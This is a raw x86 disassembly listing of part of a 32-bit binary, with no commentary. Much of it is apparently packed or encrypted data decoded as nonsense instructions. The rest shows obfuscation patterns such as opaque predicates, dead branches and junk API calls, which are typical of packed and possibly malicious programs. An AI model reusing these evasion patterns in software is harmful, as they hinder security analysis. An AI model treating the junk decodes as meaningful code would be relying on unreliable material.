  401857:	inc    eax
  401858:	jo     0x401812
  40185a:	(bad)  
  40185b:	fcom   QWORD PTR [esi-0x5]
  40185e:	lahf   
  40185f:	jae    0x4018b7
  401861:	push   edi
  401862:	repnz icebp 
  401864:	sti    
  401865:	rcl    DWORD PTR [ebx+eiz*4+0x4],cl
  401869:	fldcw  WORD PTR [ecx]
  40186b:	inc    ebx
  40186c:	mov    DWORD PTR [eax-0xc],esi
  40186f:	cmc    
  401870:	div    BYTE PTR [edx-0x5b]
  401873:	inc    ebx
  401874:	out    dx,eax
  401875:	sbb    esi,DWORD PTR [eax]
  401877:	sub    al,0x1c
  401879:	lock aam 0x7d
  40187c:	leave  
  40187d:	push   cs
  40187e:	repz js 0x401802
  401881:	imul   BYTE PTR [edx]
  401883:	lds    esp,FWORD PTR [edi-0x1a]
  401886:	fiadd  WORD PTR [ebx+0x15]
  401889:	aaa    
  40188a:	xor    eax,0x3ad32d6e
  40188f:	leave  
  401890:	cwde   
  401891:	sbb    DWORD PTR [esi-0xc626450],ebx
  401897:	inc    ecx
  401898:	dec    ebx
  401899:	pop    ebx
  40189a:	popf   
  40189b:	lahf   
  40189c:	pop    esp
  40189d:	push   edi
  40189e:	aaa    
  40189f:	minps  xmm4,XMMWORD PTR [edx+ebx*8+0x12]
  4018a4:	bound  ebx,QWORD PTR [ebx-0xe56026e]
  4018aa:	mov    eax,ds:0x59fe70fd
  4018af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4018b0:	inc    edi
  4018b1:	sbb    eax,0x33a86b9b
  4018b6:	adc    edi,DWORD PTR [ecx+0x35e6cba6]
  4018bc:	jbe    0x40184d
  4018be:	cmp    ecx,eax
  4018c0:	push   0x36
  4018c2:	stos   DWORD PTR es:[edi],eax
  4018c3:	xchg   edi,eax
  4018c5:	stc    
  4018c6:	xor    eax,0xe8530bc7
  4018cb:	jnp    0x401912
  4018cd:	mov    bl,0x66
  4018cf:	je     0x40188b
  4018d1:	mov    edi,0xb2d966cb
  4018d6:	and    BYTE PTR [ebp+0x32],dh
  4018d9:	pop    ecx
  4018da:	int3   
  4018db:	push   ss
  4018dc:	imul   edx,DWORD PTR [edi],0xffffffe4
  4018df:	adc    eax,0x3cb6d3bd
  4018e4:	(bad)  
  4018e5:	mov    bh,al
  4018e7:	adc    DWORD PTR [ecx],esi
  4018e9:	or     eax,0xa473b6f7
  4018ee:	popa   
  4018ef:	lahf   
  4018f0:	and    BYTE PTR [ebx],dh
  4018f2:	fisttp QWORD PTR [eax+0x7cd7c149]
  4018f8:	mov    dl,0x54
  4018fa:	mov    dl,0xc
  4018fc:	xchg   ebp,eax
  4018fd:	sbb    DWORD PTR [eax-0x64],0xffffffca
  401901:	iret   
  401902:	sar    DWORD PTR [ebx],cl
  401904:	push   eax
  401905:	popa   
  401906:	sub    eax,DWORD PTR [ebp-0x2e]
  401909:	mov    cl,0xb
  40190b:	mov    ecx,0x87f85905
  401910:	loope  0x401942
  401912:	mov    edx,0x6bc9d070
  401917:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401918:	cdq    
  401919:	and    DWORD PTR [ecx-0x6f],ecx
  40191c:	xor    ebx,DWORD PTR [ecx+ecx*4]
  40191f:	push   edx
  401920:	das    
  401921:	stos   DWORD PTR es:[edi],eax
  401922:	or     DWORD PTR [edi+0x3f],ebp
  401925:	idiv   ecx
  401927:	cmc    
  401928:	into   
  401929:	fld    TBYTE PTR [ebp+0x27]
  40192c:	cld    
  40192d:	mov    ?,ecx
  40192f:	outs   dx,BYTE PTR ds:[esi]
  401930:	sub    DWORD PTR [edi],edi
  401932:	pusha  
  401933:	sub    eax,edx
  401935:	mov    edx,0x31ab
  40193a:	mov    DWORD PTR [ebp-0x58],eax
  40193d:	sbb    ecx,edi
  40193f:	cmp    DWORD PTR ds:0x428237,0x0
  401946:	not    DWORD PTR ds:0x4282af
  40194c:	mov    edi,DWORD PTR ds:0x428153
  401952:	mov    DWORD PTR ds:0x42824f,edi
  401958:	jmp    0x4019ab
  40195d:	mov    DWORD PTR ds:0x4282bb,0x77e1
  401967:	not    edi
  401969:	cmp    DWORD PTR ds:0x428237,0x0
  401970:	jge    0x401993
  401976:	push   0x637b
  40197b:	call   DWORD PTR ds:0x428d3c
  401981:	mov    edx,DWORD PTR ds:0x428357
  401987:	adc    DWORD PTR ds:0x4282bf,edx
  40198d:	and    edx,DWORD PTR ds:0x42820f
  401993:	add    DWORD PTR ds:0x42823f,edx
  401999:	mov    edi,DWORD PTR ds:0x428133
  40199f:	xor    DWORD PTR ds:0x42815b,edi
  4019a5:	and    DWORD PTR ds:0x42812b,ecx
  4019ab:	mov    DWORD PTR [ebp-0x54],ecx
  4019ae:	mov    ecx,DWORD PTR ds:0x42833b
  4019b4:	sub    ecx,DWORD PTR ds:0x42823b
  4019ba:	mov    DWORD PTR ds:0x42833b,ecx
  4019c0:	or     DWORD PTR [ebp-0x58],0xca78b059
  4019c7:	sbb    DWORD PTR ds:0x42834b,edx
  4019cd:	or     DWORD PTR [ebp-0x54],0x9c1b89e8
  4019d4:	adc    edx,edx
  4019d6:	lea    eax,[ebp+0x20]
  4019d9:	mov    DWORD PTR [ebp-0xc],eax
  4019dc:	mov    DWORD PTR ds:0x428343,0x339b
  4019e6:	mov    eax,ds:0x422390
  4019eb:	cmp    DWORD PTR ds:0x428227,0x0
  4019f2:	mov    edx,0x5699
  4019f7:	movzx  edx,BYTE PTR ds:0x428237
  4019fe:	mov    edi,0xa42
  401a03:	jmp    0x401a5a
  401a08:	not    edi
  401a0a:	mov    edi,0x2eea
  401a0f:	cmp    DWORD PTR ds:0x428227,0x0
  401a16:	jg     0x401a44
  401a1c:	push   0x3b91
  401a21:	push   0x428247
  401a26:	push   DWORD PTR [ebp-0x1c]
  401a29:	push   0x478c
  401a2e:	call   DWORD PTR ds:0x428e28
  401a34:	adc    ecx,ecx
  401a36:	sbb    ecx,DWORD PTR ds:0x428147
  401a3c:	neg    edx
  401a3e:	adc    ecx,DWORD PTR ds:0x428137
  401a44:	sub    DWORD PTR ds:0x4282c3,ecx
  401a4a:	add    DWORD PTR ds:0x428143,0x42823b
  401a54:	xor    edx,DWORD PTR ds:0x4282ab
  401a5a:	mov    ecx,DWORD PTR [ebp-0xc]
  401a5d:	mov    eax,DWORD PTR [eax]
  401a5f:	add    eax,DWORD PTR [ecx]
  401a61:	sub    DWORD PTR ds:0x428153,edi
  401a67:	mov    edi,0x329e695d
  401a6c:	mov    DWORD PTR [ebp-0x14],eax
  401a6f:	inc    edx
  401a70:	mov    eax,DWORD PTR [ebp+0x18]
  401a73:	cmp    DWORD PTR ds:0x428153,0x0
  401a7a:	mov    edx,DWORD PTR ds:0x428227
  401a80:	mov    edx,0x3ce6
  401a85:	mov    DWORD PTR ds:0x4282df,0xa37
  401a8f:	jmp    0x401ae6
  401a94:	mov    DWORD PTR ds:0x42822b,0x206f
  401a9e:	cmp    DWORD PTR ds:0x428153,0x0
  401aa5:	jg     0x401ac8
  401aab:	push   0x47a2
  401ab0:	push   0x8c73
  401ab5:	push   0x8ece
  401aba:	call   DWORD PTR ds:0x428d40
  401ac0:	sub    edx,DWORD PTR ds:0x428363
  401ac6:	or     edx,ecx
  401ac8:	sub    ecx,0x6960
  401ace:	mov    ecx,DWORD PTR ds:0x42834f
  401ad4:	adc    ecx,DWORD PTR ds:0x42813f
  401ada:	mov    DWORD PTR ds:0x42834f,ecx
  401ae0:	xor    edx,DWORD PTR ds:0x42813b
  401ae6:	mov    ecx,DWORD PTR [ebp+0x1c]
  401ae9:	shrd   eax,ecx,0x2
  401aed:	cmp    DWORD PTR ds:0x428123,0x0
  401af4:	mov    edx,0x4200
  401af9:	mov    DWORD PTR ds:0x428237,0x6ba0
  401b03:	mov    DWORD PTR ds:0x42814f,0x1855
  401b0d:	jmp    0x401b6b
  401b12:	mov    DWORD PTR ds:0x42812f,0x2fa6
  401b1c:	cmp    DWORD PTR ds:0x428123,0x0
  401b23:	jge    0x401b53
  401b29:	push   DWORD PTR [ebp-0x28]
  401b2c:	push   DWORD PTR [ebp-0x20]
  401b2f:	push   0x672f
  401b34:	call   DWORD PTR ds:0x428e90
  401b3a:	movzx  edx,WORD PTR ds:0x42825f
  401b41:	and    edx,DWORD PTR ds:0x42813b
  401b47:	mov    DWORD PTR ds:0x42825f,edx
  401b4d:	and    DWORD PTR ds:0x428217,edx
  401b53:	add    DWORD PTR ds:0x42835b,edx
  401b59:	sub    edx,DWORD PTR ds:0x428263
  401b5f:	add    DWORD PTR ds:0x42821b,edi
  401b65:	or     edx,DWORD PTR ds:0x428347
  401b6b:	shr    ecx,0x2
  401b6e:	mov    ecx,DWORD PTR [ebp+0x18]
  401b71:	cmp    DWORD PTR ds:0x4282cb,0x0
  401b78:	mov    DWORD PTR ds:0x428263,0x3b05
  401b82:	mov    edx,0x7243
  401b87:	mov    DWORD PTR ds:0x428133,0x6e0d
  401b91:	jmp    0x401bec
  401b96:	mov    edx,0x2e5f
  401b9b:	mov    edx,DWORD PTR ds:0x428207
  401ba1:	cmp    DWORD PTR ds:0x4282cb,0x0
  401ba8:	je     0x401be0
  401bae:	push   DWORD PTR [ebp-0x18]
  401bb1:	push   DWORD PTR [ebp-0x20]
  401bb4:	push   DWORD PTR [ebp-0x10]
  401bb7:	push   0x15fe
  401bbc:	push   0x400000
  401bc1:	call   DWORD PTR ds:0x428d54
  401bc7:	sub    DWORD PTR ds:0x4282b7,ecx
  401bcd:	movzx  edx,WORD PTR ds:0x42821b
  401bd4:	add    DWORD PTR ds:0x4282c7,edx
  401bda:	add    DWORD PTR ds:0x42811f,ebx
  401be0:	sbb    DWORD PTR ds:0x4281ef,edi
  401be6:	inc    DWORD PTR ds:0x4281ef
  401bec:	mov    edx,DWORD PTR [ebp+0x1c]
  401bef:	xor    eax,edi
  401bf1:	xor    edx,edx
  401bf3:	or     DWORD PTR ds:0x428353,0x4281f7
  401bfd:	or     edx,eax
  401bff:	jmp    0x401fdd
  401c04:	xchg   ebp,eax
  401c05:	xchg   ecx,eax
  401c06:	je     0x401c58
  401c08:	ins    BYTE PTR es:[edi],dx
  401c09:	sub    al,0x2d
  401c0b:	dec    esp
  401c0c:	and    eax,0x3ab0afeb
  401c11:	ins    DWORD PTR es:[edi],dx
  401c12:	in     eax,0xaa
  401c14:	and    eax,0x9e18180a
  401c19:	adc    bl,BYTE PTR [eax]
  401c1b:	sbb    al,bh
  401c1d:	mov    ?,WORD PTR [ebx]
  401c1f:	sub    DWORD PTR [ebp-0x392df9aa],eax
  401c25:	je     0x401c38
  401c27:	(bad)  
  401c28:	sbb    eax,0xa28e91f9
  401c2d:	out    0x1e,al
  401c2f:	repz push ecx
  401c31:	xor    BYTE PTR [edx],ah
  401c33:	nop
  401c34:	pop    ecx
  401c35:	imul   esp,DWORD PTR [esi+0x6ceb60],0xf317dc78
  401c3f:	pop    es
  401c40:	ja     0x401c66
  401c42:	adc    al,0xdd
  401c44:	std    
  401c45:	sub    BYTE PTR [eax],cl
  401c47:	push   es
  401c48:	push   ss
  401c49:	lea    eax,[ecx-0x70151db1]
  401c4f:	xchg   esp,eax
  401c50:	mov    esi,0xbe93b57b
  401c55:	stos   BYTE PTR es:[edi],al
  401c56:	xor    al,al
  401c58:	(bad)  
  401c59:	rcl    DWORD PTR [ebx+0x60f8758],0x93
  401c60:	sbb    DWORD PTR [edx+0x47cd2a94],esi
  401c66:	mov    ds:0x3be77760,eax
  401c6b:	in     eax,0xd9
  401c6d:	fwait
  401c6e:	sub    BYTE PTR [edi+0x44],ch
  401c71:	leave  
  401c72:	(bad)  
  401c74:	fcom   st(4)
  401c76:	hlt    
  401c77:	scas   al,BYTE PTR es:[edi]
  401c78:	and    dl,cl
  401c7a:	lods   al,BYTE PTR ds:[esi]
  401c7b:	push   ebp
  401c7c:	mov    fs,WORD PTR ds:0x8a294b8c
  401c82:	sbb    eax,0xd56eb400
  401c87:	mov    esp,0x5b532983
  401c8c:	nop
  401c8d:	icebp  
  401c8e:	or     al,dh
  401c90:	shr    DWORD PTR [edi-0xf],0x34
  401c94:	pop    eax
  401c95:	popf   
  401c96:	mov    DWORD PTR [edx],ebp
  401c98:	cdq    
  401c99:	mov    ebp,0xccad1f06
  401c9e:	cld    
  401c9f:	jge    0x401c4c
  401ca1:	or     eax,0x5576ca9c
  401ca6:	ror    DWORD PTR [ecx-0x9ba00fd],cl
  401cac:	xor    edx,edi
  401cae:	ret    0xe379
  401cb1:	xor    DWORD PTR [eax+0x63],ebp
  401cb4:	in     al,dx
  401cb5:	out    dx,al
  401cb6:	pusha  
  401cb7:	call   0x351fbc92
  401cbc:	jo     0x401d0b
  401cbe:	sti    
  401cbf:	sub    esp,DWORD PTR [ebx]
  401cc1:	into   
  401cc2:	rcl    esp,cl
  401cc4:	dec    ebp
  401cc5:	add    dh,BYTE PTR [ecx]
  401cc7:	(bad)  
  401cc8:	jbe    0x401c4f
  401cca:	std    
  401ccb:	call   0x7db41b5f
  401cd0:	mov    ebp,0xfdd60bec
  401cd5:	scas   al,BYTE PTR es:[edi]
  401cd6:	test   al,0x5b
  401cd8:	push   es
  401cd9:	pop    eax
  401cda:	mov    bl,dh
  401cdc:	and    ecx,DWORD PTR [ebp+eiz*1+0x57]
  401ce0:	push   ds
  401ce1:	out    dx,eax
  401ce2:	cdq    
  401ce3:	cmp    ah,BYTE PTR [edi+0x51]
  401ce6:	outs   dx,BYTE PTR ds:[esi]
  401ce7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ce8:	or     ebx,ebp
  401cea:	jno    0x401d35
  401cec:	add    esp,DWORD PTR [edx+0x74]
  401cef:	mov    bh,0xe
  401cf1:	aad    0xbe
  401cf3:	fdivr  DWORD PTR [edx+0x53]
  401cf6:	or     eax,0x719276f3
  401cfb:	push   edi
  401cfc:	adc    DWORD PTR [esi+0x1e0a2baa],edx
  401d02:	call   0x4c5a11fb
  401d07:	push   ebp
  401d08:	mov    ch,0x97
  401d0a:	add    BYTE PTR [edi-0x2631b226],bl
  401d10:	push   ecx
  401d11:	mov    ch,BYTE PTR [eax+eax*1-0x5d]
  401d15:	xchg   ebx,eax
  401d16:	ret    0xee4e
  401d19:	(bad)  
  401d1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d1b:	scas   eax,DWORD PTR es:[edi]
  401d1c:	xchg   edi,eax
  401d1d:	sahf   
  401d1e:	dec    ecx
  401d1f:	or     eax,0xfa06b875
  401d24:	pop    ecx
  401d25:	sbb    BYTE PTR [eax],al
  401d27:	xor    al,0x4d
  401d29:	shl    DWORD PTR [esi-0x29],cl
  401d2c:	dec    edx
  401d2d:	jae    0x401d51
  401d2f:	aas    
  401d30:	rcr    DWORD PTR [edx-0x31],cl
  401d33:	out    dx,al
  401d34:	sar    cl,cl
  401d36:	cmc    
  401d37:	cwde   
  401d38:	xchg   BYTE PTR [esp+edi*4],bl
  401d3b:	jle    0x401cdb
  401d3d:	aaa    
  401d3e:	pop    ebx
  401d3f:	mov    eax,ds:0x4b631aa8
  401d44:	addr16 mov ebp,0xfe46ae3
  401d4a:	lahf   
  401d4b:	adc    eax,0xafe6209f
  401d50:	sub    eax,0xa8a6c820
  401d55:	adc    DWORD PTR [edx],esi
  401d57:	lods   al,BYTE PTR ds:[esi]
  401d58:	jbe    0x401d99
  401d5a:	mov    bl,0xf
  401d5c:	inc    edx
  401d5d:	ret    
  401d5e:	test   DWORD PTR [edi+0x72],esi
  401d61:	mov    eax,ds:0xaf6a52ac
  401d66:	stc    
  401d67:	sahf   
  401d68:	leave  
  401d69:	stos   BYTE PTR es:[edi],al
  401d6a:	sbb    al,0xed
  401d6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d6d:	push   edx
  401d6e:	push   edx
  401d6f:	scas   al,BYTE PTR es:[edi]
  401d70:	dec    ebp
  401d71:	fisttp DWORD PTR [esi+0x71]
  401d74:	lds    ebp,FWORD PTR [ebx]
  401d76:	pop    edx
  401d77:	mov    BYTE PTR [ebp+0x499e142e],dh
  401d7d:	inc    esi
  401d7e:	loopne 0x401dc2
  401d80:	push   edx
  401d81:	sub    eax,0xede74f8b
  401d86:	mov    ebp,0x45303315
  401d8b:	pop    ecx
  401d8c:	out    dx,al
  401d8d:	mov    esp,0xa28b9680
  401d92:	aas    
  401d93:	nop
  401d94:	cmp    DWORD PTR [edx],edx
  401d96:	popf   
  401d97:	in     al,dx
  401d98:	enter  0xea49,0x36
  401d9c:	dec    edi
  401d9d:	mov    edi,esp
  401d9f:	std    
  401da0:	(bad)  
  401da1:	enter  0x7f4f,0x13
  401da5:	mov    ah,0xea
  401da7:	mov    ?,edx
  401da9:	inc    esp
  401daa:	push   ss
  401dab:	cmc    
  401dac:	cmp    DWORD PTR [ebx+0x2f7d40b8],edx
  401db2:	retf   0xf8b8
  401db5:	(bad)  
  401db7:	push   edx
  401db8:	(bad)  
  401db9:	push   esi
  401dba:	push   edx
  401dbb:	jle    0x401dba
  401dbd:	inc    esi
  401dbe:	adc    BYTE PTR [edi+0x73],bl
  401dc1:	lds    esp,FWORD PTR [ecx-0x7bba83de]
  401dc7:	sbb    BYTE PTR [edx+eiz*4+0x549dfda0],bl
  401dce:	jmp    0x59d7f00f
  401dd3:	ret    
  401dd4:	mov    dh,0x88
  401dd6:	inc    edx
  401dd7:	jb     0x401e3b
  401dd9:	jg     0x401dbd
  401ddb:	neg    DWORD PTR [esp+eiz*4+0x4b]
  401ddf:	lahf   
  401de0:	stc    
  401de1:	sbb    BYTE PTR [ebx],bl
  401de3:	or     eax,0x135a3b28
  401de8:	in     eax,dx
  401de9:	das    
  401dea:	pop    es
  401deb:	test   BYTE PTR [eax+0x3e25c64],ah
  401df1:	pop    esp
  401df2:	test   dh,al
  401df4:	mul    BYTE PTR [esi]
  401df6:	push   edx
  401df7:	clc    
  401df8:	sub    dh,BYTE PTR [esi]
  401dfa:	mov    ch,0xae
  401dfc:	sub    eax,0x37defb66
  401e01:	xor    DWORD PTR [ebx+0x6c],ebp
  401e04:	or     esi,DWORD PTR [edi]
  401e06:	cmp    BYTE PTR [edx+0x1254d87d],dl
  401e0c:	cmp    DWORD PTR [edx+0x4de4208b],0xe5fc3ac6
  401e16:	and    DWORD PTR [esi],ebp
  401e18:	leave  
  401e19:	cmp    eax,0x814f763d
  401e1e:	jo     0x401e96
  401e20:	shr    BYTE PTR ss:[esi],cl
  401e23:	fild   DWORD PTR [esi]
  401e25:	adc    ebp,0x6e
  401e28:	arpl   WORD PTR [ecx+0x5b],di
  401e2b:	xchg   BYTE PTR [edi],al
  401e2d:	add    esp,0x30
  401e30:	fs xor bl,ah
  401e33:	aas    
  401e34:	(bad)  
  401e35:	and    DWORD PTR [ecx-0x33],esp
  401e38:	jl     0x401df5
  401e3a:	lea    edx,[edx]
  401e3c:	mov    ds:0xdcc41b67,eax
  401e41:	fimul  WORD PTR [edi]
  401e43:	and    eax,0xb3271ab4
  401e48:	xchg   esi,eax
  401e49:	add    ah,bl
  401e4b:	les    ebp,FWORD PTR [ecx]
  401e4d:	(bad)  
  401e4e:	jmp    FWORD PTR [esi+edx*2]
  401e51:	inc    esi
  401e52:	cmp    eax,0x45d7f6e3
  401e57:	sub    edi,DWORD PTR [esp+edx*8-0x4fd10429]
  401e5e:	add    bh,dl
  401e60:	xor    ch,BYTE PTR [ebx+edx*8-0x3e]
  401e64:	pop    ebx
  401e65:	outs   dx,DWORD PTR ds:[esi]
  401e66:	imul   edx,DWORD PTR [esi+0x37],0xc89f38b2
  401e6d:	cmp    DWORD PTR [eax],0x25
  401e70:	xor    BYTE PTR ds:0xd4db0474,bh
  401e76:	dec    ecx
  401e77:	push   ebx
  401e78:	mov    esi,DWORD PTR [eax]
  401e7a:	and    DWORD PTR [esi],esp
  401e7c:	arpl   WORD PTR [edi],cx
  401e7e:	cs mov edx,0xa7f4247e
  401e84:	cli    
  401e85:	or     ebx,eax
  401e87:	xor    BYTE PTR [edi+0x8],ah
  401e8a:	jbe    0x401ef4
  401e8c:	bound  eax,QWORD PTR [eax-0xc626cb1]
  401e92:	adc    eax,DWORD PTR [edx-0x363d4c4e]
  401e98:	out    0x4,eax
  401e9a:	(bad)  
  401e9c:	jecxz  0x401e45
  401e9e:	mov    ecx,0x8420f1e2
  401ea3:	add    bl,dl
  401ea5:	das    
  401ea6:	cli    
  401ea7:	push   ebp
  401ea8:	add    al,0xd8
  401eaa:	push   edi
  401eab:	(bad)  
  401eac:	mov    edx,0x308ae30a
  401eb1:	adc    al,0xa1
  401eb3:	mov    bh,0x6f
  401eb5:	sbb    esi,DWORD PTR [ebx]
  401eb7:	dec    ebp
  401eb8:	lock outs dx,BYTE PTR ds:[esi]
  401eba:	fs retf 
  401ebc:	daa    
  401ebd:	ret    0xbfd5
  401ec0:	and    DWORD PTR [edi],ebx
  401ec2:	push   esp
  401ec3:	mov    ds:0xe59d20a1,al
  401ec8:	in     al,dx
  401ec9:	test   eax,0x2c13f87d
  401ece:	pop    ecx
  401ecf:	pop    ss
  401ed0:	leave  
  401ed1:	(bad)  [esi+eax*1]
  401ed4:	lods   al,BYTE PTR ds:[esi]
  401ed5:	sbb    DWORD PTR [ebx],0x3e7fedfb
  401edb:	ins    DWORD PTR es:[edi],dx
  401edc:	aam    0x6c
  401ede:	adc    ch,bl
  401ee0:	leave  
  401ee1:	int    0x22
  401ee3:	mov    al,0x8
  401ee5:	call   0x6ef00d54
  401eea:	mov    dl,0xd1
  401eec:	pop    ebp
  401eed:	add    al,0x3
  401eef:	push   edx
  401ef0:	jmp    0x401eb7
  401ef2:	xchg   esp,eax
  401ef3:	xlat   BYTE PTR ds:[ebx]
  401ef4:	sub    ebp,DWORD PTR [eax+0x47]
  401ef7:	retf   
  401ef8:	dec    ecx
  401ef9:	dec    ebx
  401efa:	out    dx,al
  401efb:	stc    
  401efc:	pop    esp
  401efd:	div    bh
  401eff:	xor    al,0x55
  401f01:	xor    bl,BYTE PTR [eax-0x6c]
  401f04:	mov    esi,0x94bb2586
  401f09:	pop    esp
  401f0a:	push   esp
  401f0b:	sub    eax,0x52fcfeb8
  401f10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f11:	push   0x32dbd73e
  401f16:	jl     0x401f42
  401f18:	dec    ecx
  401f19:	enter  0x696b,0xb
  401f1d:	cwde   
  401f1e:	sbb    dh,BYTE PTR [esi]
  401f20:	xor    ebx,ebp
  401f22:	xchg   ecx,eax
  401f23:	mov    bl,0xf5
  401f25:	mov    ah,0x3e
  401f27:	iret   
  401f28:	mov    dl,BYTE PTR [ebp+ebx*8-0x78]
  401f2c:	adc    bh,BYTE PTR [edi+0x38]
  401f2f:	pop    esp
  401f30:	aas    
  401f31:	outs   dx,DWORD PTR ds:[esi]
  401f32:	inc    esi
  401f33:	test   ecx,edx
  401f35:	pop    edi
  401f36:	fisttp DWORD PTR [ebp+0x55]
  401f39:	pop    esi
  401f3a:	adc    eax,0xbe5c3f6
  401f3f:	clc    
  401f40:	and    al,0x7f
  401f42:	ins    DWORD PTR es:[edi],dx
  401f43:	dec    esp
  401f44:	add    eax,0xcab6449b
  401f49:	or     esi,DWORD PTR [ebx]
  401f4b:	mov    ah,0xad
  401f4d:	xchg   ecx,eax
  401f4e:	sbb    eax,0x120294ec
  401f53:	scas   al,BYTE PTR es:[edi]
  401f54:	dec    esp
  401f55:	div    BYTE PTR [esi+0x62]
  401f58:	adc    edi,DWORD PTR [edx+0xa9e3610]
  401f5e:	add    BYTE PTR [esi],cl
  401f60:	jge    0x401fdc
  401f62:	fld    QWORD PTR [eax]
  401f64:	sar    BYTE PTR [ebp-0x52f05e5c],0x43
  401f6b:	imul   edi,DWORD PTR [edx+eiz*2-0x2583430],0x90440a11
  401f76:	pushf  
  401f77:	cmp    ch,cl
  401f79:	inc    ebx
  401f7a:	mov    edx,DWORD PTR [ebp-0x48e05a5b]
  401f80:	mov    edi,ebx
  401f82:	push   esi
  401f83:	stos   BYTE PTR es:[edi],al
  401f84:	jo     0x401f65
  401f86:	sub    BYTE PTR [ebx],0xa0
  401f89:	or     BYTE PTR [ebx+0x4e],ah
  401f8c:	shl    esi,cl
  401f8e:	nop
  401f8f:	jnp    0x402004
  401f91:	mov    ecx,0x8a7b9fcd
  401f96:	pop    ds
  401f97:	ret    
  401f98:	call   0x8a725140
  401f9d:	adc    bl,ah
  401f9f:	fisttp WORD PTR [edx-0x1f]
  401fa2:	xchg   edx,eax
  401fa3:	dec    edx
  401fa4:	jnp    0x401fad
  401fa6:	inc    ebp
  401fa7:	pop    edi
  401fa8:	push   ss
  401fa9:	adc    eax,0xb1aceea7
  401fae:	mov    esi,0x4cb34b17
  401fb3:	fild   DWORD PTR [eax-0x72]
  401fb6:	and    al,BYTE PTR [edi]
  401fb8:	lds    edx,FWORD PTR [eax-0x7c597e35]
  401fbe:	mov    cl,0xa4
  401fc0:	and    eax,0x811d2567
  401fc5:	jle    0x401f7a
  401fc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401fc8:	pop    ecx
  401fc9:	inc    ebp
  401fca:	in     eax,dx
  401fcb:	dec    eax
  401fcc:	fldenv [esi+0x301d2e05]
  401fd2:	or     al,0xd9
  401fd4:	cmp    BYTE PTR [ebx+0x79666712],ch
  401fda:	stos   DWORD PTR es:[edi],eax
  401fdb:	icebp  
  401fdc:	push   ebp
  401fdd:	mov    DWORD PTR [ebp-0x3c],edx
  401fe0:	mov    DWORD PTR [ebp-0x70],0x2c55
  401fe7:	mov    eax,ds:0x42832b
  401fec:	adc    DWORD PTR ds:0x428367,eax
  401ff2:	mov    DWORD PTR [ebp-0x6c],0x456f
  401ff9:	cmp    DWORD PTR ds:0x42834b,0x0
  402000:	mov    DWORD PTR ds:0x42824b,0x4df8
  40200a:	mov    DWORD PTR ds:0x428333,0x33aa
  402014:	jmp    0x402076
  402019:	mov    eax,0x569b
  40201e:	mov    eax,0x2370
  402023:	cmp    DWORD PTR ds:0x42834b,0x0
  40202a:	jbe    0x40205c
  402030:	push   DWORD PTR [ebp-0xc]
  402033:	push   0x3ea9
  402038:	call   DWORD PTR ds:0x428d58
  40203e:	or     DWORD PTR ds:0x42812f,0x6f29
  402048:	xor    DWORD PTR ds:0x4282cb,0x4282bf
  402052:	add    DWORD PTR ds:0x42824b,0x4282e7
  40205c:	and    DWORD PTR ds:0x42835b,edi
  402062:	mov    DWORD PTR ds:0x42823b,0x2a04
  40206c:	sub    DWORD PTR ds:0x42815b,0x42811b
  402076:	mov    DWORD PTR [ebp-0x70],0x78a6
  40207d:	cmp    DWORD PTR ds:0x4282af,0x0
  402084:	mov    DWORD PTR ds:0x4282ab,ecx
  40208a:	mov    DWORD PTR ds:0x428157,0x59f
  402094:	mov    DWORD PTR ds:0x428157,ecx
  40209a:	mov    DWORD PTR ds:0x4282d7,0x5800
  4020a4:	jmp    0x402119
  4020a9:	mov    eax,0x445d
  4020ae:	cmp    DWORD PTR ds:0x4282af,0x0
  4020b5:	ja     0x4020ec
  4020bb:	push   0x42812b
  4020c0:	push   DWORD PTR [ebp-0x10]
  4020c3:	push   0x842c
  4020c8:	call   DWORD PTR ds:0x428e94
  4020ce:	sbb    DWORD PTR ds:0x42833b,0x4ff2
  4020d8:	xor    DWORD PTR ds:0x4282bb,0x42822f
  4020e2:	adc    DWORD PTR ds:0x42832f,0x4c73
  4020ec:	add    DWORD PTR ds:0x42832f,0x42835f
  4020f6:	and    DWORD PTR ds:0x428117,0x428333
  402100:	sbb    DWORD PTR ds:0x42811b,0x5f9d
  40210a:	sbb    DWORD PTR ds:0x4282af,0x42825f
  402114:	sbb    eax,0x5252
  402119:	mov    DWORD PTR [ebp-0x6c],0x188
  402120:	neg    eax
  402122:	mov    DWORD PTR [ebp-0x70],0x5b3f
  402129:	mov    DWORD PTR [ebp-0x6c],0x3219
  402130:	mov    DWORD PTR [ebp-0x70],0x231c
  402137:	mov    eax,ds:0x4282ab
  40213c:	add    DWORD PTR ds:0x428247,eax
  402142:	mov    DWORD PTR [ebp-0x6c],0x1337
  402149:	mov    eax,ds:0x42833b
  40214e:	add    DWORD PTR ds:0x4282d7,eax
  402154:	mov    DWORD PTR [ebp-0x70],0x7593
  40215b:	cmp    DWORD PTR ds:0x428127,0x0
  402162:	mov    DWORD PTR ds:0x42834b,0x750f
  40216c:	not    DWORD PTR ds:0x428333
  402172:	jmp    0x4021e4
  402177:	mov    DWORD PTR ds:0x42822b,0x610f
  402181:	mov    eax,ds:0x42813f
  402186:	cmp    DWORD PTR ds:0x428127,0x0
  40218d:	jle    0x4021c5
  402193:	push   0x428029
  402198:	push   DWORD PTR [ebp-0x28]
  40219b:	push   0x1818
  4021a0:	push   DWORD PTR [ebp-0x18]
  4021a3:	push   0x8e39
  4021a8:	push   DWORD PTR [ebp-0x1c]
  4021ab:	call   DWORD PTR ds:0x428e30
  4021b1:	adc    DWORD PTR ds:0x42824f,0x428223
  4021bb:	add    DWORD PTR ds:0x42820f,0x168f
  4021c5:	sub    DWORD PTR ds:0x4282b3,0x428153
  4021cf:	or     DWORD PTR ds:0x428353,0xa53
  4021d9:	mov    eax,ds:0x428207
  4021de:	xor    DWORD PTR ds:0x42811b,eax
  4021e4:	mov    DWORD PTR [ebp-0x6c],0x11b8
  4021eb:	xor    eax,0x39f6
  4021f0:	jmp    0x4025ce
  4021f5:	stos   DWORD PTR es:[edi],eax
  4021f6:	fisttp QWORD PTR [edi+0x32]
  4021f9:	aas    
  4021fa:	and    ch,BYTE PTR [edx-0x2c2c85a4]
  402200:	mov    esp,0xaa25ec9e
  402205:	stos   DWORD PTR es:[edi],eax
  402206:	add    bl,BYTE PTR [eax]
